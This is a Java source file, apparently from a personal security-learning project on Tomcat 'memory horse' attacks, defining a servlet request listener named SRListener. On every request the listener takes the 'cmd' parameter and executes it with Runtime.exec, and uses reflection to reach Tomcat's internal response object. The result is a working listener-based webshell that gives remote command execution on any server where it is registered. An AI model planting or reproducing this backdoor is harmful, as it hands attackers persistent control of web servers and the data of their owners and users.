package com.xjjlearning.hack.tomcat.memoryhorse.memoryhorse.evillistener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

/**
 * Created by xjj on 2023/6/20.
 */
@WebListener("/listener") // listener is the description of this listener
public class SRListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
//        StandardWrapper
//        ServletRequestListener.super.requestDestroyed(sre);
//        Filter
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();//下断点
        String cmd = req.getParameter("cmd");
        try {
            Field reqField = req.getClass().getDeclaredField("request");
            reqField.setAccessible(true);
            // org.apache.catalina.connector.Request
            Object reqObj = reqField.get(req);
            // org.apache.catalina.connector.Response
            HttpServletResponse rep = (HttpServletResponse) reqObj.getClass().getDeclaredMethod("getResponse").invoke(reqObj);
            PrintWriter out = rep.getWriter();
//            rep.sendError(404);
            out.println("listener_xjj_test");
        } catch (NoSuchFieldException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e) {
            e.printStackTrace();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException | NullPointerException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
//        ServletRequestListener.super.requestInitialized(sre);
    }
}
